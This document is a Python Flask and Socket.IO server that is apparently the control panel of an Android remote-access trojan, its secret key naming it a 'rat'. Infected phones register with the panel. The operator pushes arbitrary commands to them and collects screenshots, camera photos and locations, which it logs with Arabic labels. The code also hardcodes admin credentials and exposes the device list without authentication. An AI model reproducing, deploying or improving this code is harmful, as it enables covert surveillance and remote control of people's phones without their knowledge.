from flask import Flask, render_template, request, redirect, session, jsonify
from flask_socketio import SocketIO, emit, join_room
import os
import uuid
import psutil
from datetime import datetime
from collections import deque

ADMIN_USER = "Pris"
ADMIN_PASS = "you are77"
SECRET_KEY = "pris_rat_secret_2026"

app = Flask(__name__)
app.secret_key = SECRET_KEY
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")

devices = {}
activity_log = deque(maxlen=50)


def log_activity(icon, text, device=None):
    activity_log.appendleft({
        "icon": icon,
        "text": text,
        "device": device,
        "time": datetime.now().strftime("%H:%M")
    })


@app.route("/")
def index():
    if "user" in session:
        return redirect("/dashboard")
    return redirect("/login")


@app.route("/login", methods=["GET", "POST"])
def login():
    error = None
    if request.method == "POST":
        u = request.form.get("username", "")
        p = request.form.get("password", "")
        if u == ADMIN_USER and p == ADMIN_PASS:
            session["user"] = u
            session.permanent = True
            return redirect("/dashboard")
        error = "بيانات غير صحيحة"
    return render_template("login.html", error=error)


@app.route("/logout")
def logout():
    session.clear()
    return redirect("/login")


@app.route("/dashboard")
def dashboard():
    if "user" not in session:
        return redirect("/login")
    total = len(devices)
    online = sum(1 for d in devices.values() if d.get("online"))
    dev_list = []
    for k, v in devices.items():
        d = dict(v)
        d["id"] = k
        dev_list.append(d)
    return render_template(
        "dashboard.html",
        total=total,
        online=online,
        offline=total - online,
        devices=dev_list,
        session_user=session.get("user", "Admin"),
        activity=list(activity_log)[:8]
    )


@app.route("/screen")
def screen_view():
    if "user" not in session:
        return redirect("/login")
    return render_template("screen.html")


@app.route("/settings")
def settings_page():
    if "user" not in session:
        return redirect("/login")
    return render_template("settings.html")


@app.route("/api/devices")
def api_devices():
    return jsonify(devices)


@app.route("/api/system")
def api_system():
    try:
        cpu = psutil.cpu_percent(interval=0.1)
        mem = psutil.virtual_memory()
        disk = psutil.disk_usage("/")
        net = psutil.net_io_counters()
        return jsonify({
            "cpu": round(cpu, 1),
            "ram": round(mem.percent, 1),
            "disk": round(disk.percent, 1),
            "net_sent": round(net.bytes_sent / 1024 / 1024, 1),
            "net_recv": round(net.bytes_recv / 1024 / 1024, 1)
        })
    except Exception:
        return jsonify({"cpu": 0, "ram": 0, "disk": 0, "net_sent": 0, "net_recv": 0})


@app.route("/api/activity")
def api_activity():
    return jsonify(list(activity_log)[:15])


@app.route("/api/ping")
def api_ping():
    return jsonify({"status": "ok"})


@socketio.on("register")
def on_register(data):
    did = data.get("id", str(uuid.uuid4())[:8])
    devices[did] = {
        "id": did,
        "model": data.get("model", "Unknown"),
        "android": data.get("android", "?"),
        "battery": data.get("battery", 0),
        "charging": data.get("charging", False),
        "ip": request.remote_addr,
        "online": True,
        "last_seen": datetime.now().strftime("%H:%M"),
        "sid": request.sid
    }
    join_room(did)
    emit("registered", {"id": did}, room=request.sid)
    socketio.emit("devices_update", devices, broadcast=True)
    log_activity("🟢", "جهاز متصل", data.get("model", "Unknown"))


@socketio.on("heartbeat")
def on_heartbeat(data):
    did = data.get("id")
    if did in devices:
        devices[did]["battery"] = data.get("battery", 0)
        devices[did]["charging"] = data.get("charging", False)
        devices[did]["online"] = True
        devices[did]["last_seen"] = datetime.now().strftime("%H:%M")
        socketio.emit("devices_update", devices, broadcast=True)


@socketio.on("send_command")
def on_send_command(data):
    target = data.get("target")
    action = data.get("action")
    params = data.get("params", {})
    if target and target in devices:
        cmd = {"action": action}
        cmd.update(params)
        socketio.emit("execute", cmd, room=target)
        device_name = devices[target].get("model", "?")
        log_activity("📤", f"أمر: {action}", device_name)


@socketio.on("response")
def on_response(data):
    rtype = data.get("type")
    did = data.get("id")
    device_name = devices.get(did, {}).get("model", "?")
    if rtype == "screen":
        log_activity("📸", "شاشة مستلمة", device_name)
    elif rtype == "camera":
        log_activity("📷", "صورة مستلمة", device_name)
    elif rtype == "location":
        log_activity("📍", "موقع مستلم", device_name)
    socketio.emit("device_response", data, broadcast=True)


@socketio.on("remove_device")
def on_remove_device(data):
    did = data.get("id")
    if did and did in devices:
        name = devices[did].get("model", "?")
        del devices[did]
        socketio.emit("devices_update", devices, broadcast=True)
        log_activity("🗑️", "تم الإزالة", name)


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    socketio.run(app, host="0.0.0.0", port=port, debug=False, allow_unsafe_werkzeug=True)